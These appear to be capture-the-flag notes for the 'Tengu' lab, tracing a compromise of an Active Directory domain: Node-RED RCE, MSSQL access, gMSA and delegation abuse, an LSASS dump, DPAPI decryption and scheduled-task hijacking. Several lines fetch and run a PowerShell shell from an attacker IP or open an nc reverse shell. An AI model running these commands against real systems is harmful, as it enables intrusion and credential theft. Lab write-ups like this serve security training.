Scan : 

Linux
```sh
PORT     STATE SERVICE
22/tcp   open  ssh
1880/tcp open  vsat-control
```
SQL 
```sh
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
|_ssl-date: 2024-08-22T08:14:23+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: TENGU
|   NetBIOS_Domain_Name: TENGU
|   NetBIOS_Computer_Name: SQL
|   DNS_Domain_Name: tengu.vl
|   DNS_Computer_Name: SQL.tengu.vl
|   DNS_Tree_Name: tengu.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-22T08:14:23+00:00
| ssl-cert: Subject: commonName=SQL.tengu.vl
| Not valid before: 2024-03-24T13:19:50
|_Not valid after:  2024-09-23T13:19:50
```

- RCE : 
https://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297

- Decrypt password : 
https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519
```sh
{'d237b4c16a396b9e': {'username': 'nodered_connector', 'password': 'DreamPuppyOverall25'}}
```

- Connect with mssql with theses creds : 
```sh
SQL (nodered_connector  nodered_connector@Dev)> SELECT TABLE_NAME FROM Demo.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
TABLE_NAME
----------
Users

SQL (nodered_connector  nodered_connector@Dev)> use demo
[*] ENVCHANGE(DATABASE): Old Value: Dev, New Value: Demo
[*] INFO(SQL): Line 1: Changed database context to 'Demo'.
SQL (nodered_connector  nodered_connector@Demo)> select * from Users ;
  ID   Username          Password
----   ---------------   -------------------------------------------------------------------
NULL   b't2_m.winters'   b'af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147'

```

New creds :
```sh
t2_m.winters : Tengu123
nodered_connector : DreamPuppyOverall25
t1_c.fowler :
WDAGUtilityAccount : 
#Now root on the linux machine 
```

User VL{2c6d9107958f338659c95a810e4938d5}

- Retrieve keystab : 
```sh
cat /etc/krb5.keytab | base64
python3 keytabextract.py file.keytab
```

```sh
 python3 keytabextract.py krb5.keytab
 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : TENGU.VL
        SERVICE PRINCIPAL : NODERED$/
        NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f
```

```sh
NODERED$ : d4210ee2db0c03aa3611c9ef8a4dbf49
```

```sh
proxychains -q bloodhound-python -d 'tengu.vl' -u 'NODERED$' --hashes ':d4210ee2db0c03aa3611c9ef8a4dbf49' -ns 10.10.158.181 -dc DC.tengu.vl -c all
```

```sh
proxychains -q nxc ldap 10.10.158.181 -u 'NODERED$' -H 'd4210ee2db0c03aa3611c9ef8a4dbf49'  --gmsa

Account: gMSA01$              NTLM: d4b65861e85773fba2035b31ebcacb37
```

Constrained delegation: 
```sh
proxychains -q getST.py tengu.vl/gMSA01$ -spn 'MSSQLSvc/SQL.tengu.vl:1433' -impersonate 'T1_M.WINTERS' -hashes :d4b65861e85773fba2035b31ebcacb37 -dc-ip DC.tengu.vl

export KRB5CCNAME=T1_M.WINTERS.ccache

proxychains -q mssqlclient.py -k SQL.tendu.vl
```

- Foothold : 
```sh
EXEC xp_cmdshell 'powershell -Command "& {IEX (New-Object Net.WebClient).DownloadString(''http://10.8.3.12:8080/shell.ps1'')}"';

PrintSpoofer.exe -c "C:\tools\nc.exe 10.8.3.12 3333 -e cmd"
```

User VL{e1f0df5961b9a6e06e9a3836cf414d56}

- Dump : 
```sh
procdump.exe -accepteula -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp
```

- Creds:
```sh
SQL$ : 740a641ebed8f94dd009dd576bcae0cc
gMSA01$ b571730c862f68e2bb2e39b632d888a4
```

- gMSA again : 
```sh
proxychains -q nxc ldap 10.10.158.181 -u 'SQL$' -H '740a641ebed8f94dd009dd576bcae0cc' --gmsa

Account: gMSA01$              NTLM: d4b65861e85773fba2035b31ebcacb37
Account: gMSA02$              NTLM: 1baebed1f44a7f60ec622232a1d885db
```

```sh
cmd /c "curl http://10.8.3.12:8080/SharpDPAPI.exe > SharpDPAPI.exe"
```

```sh
Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 67B6C9FA0475C51A637428875C335AAD

    guidMasterKey    : {1415bc56-749a-4f03-8a8e-9fb9733359ab}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 3/10/2024 2:49:34 PM
    TargetName       : Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2}
    TargetAlias      :
    Comment          :
    UserName         : TENGU\T0_c.fowler
    Credential       : UntrimmedDisplaceModify25

```

```sh
Get-Acl Task.ps1

schtasks /query /fo LIST /v
type shell.ps1 > Task.ps1

Get-ScheduledTask -TaskName "Daily_Checkup" | Start-ScheduledTask
rdesktop -u "T0_c.fowler" -d TENGU DC.tengu.vl

#or 

cat \\dc.tengu.vl\C$\Users\Administrator\Desktop\root.txt
```

Root VL{6f106b09ff464e7ef0b36483e348dbc9}
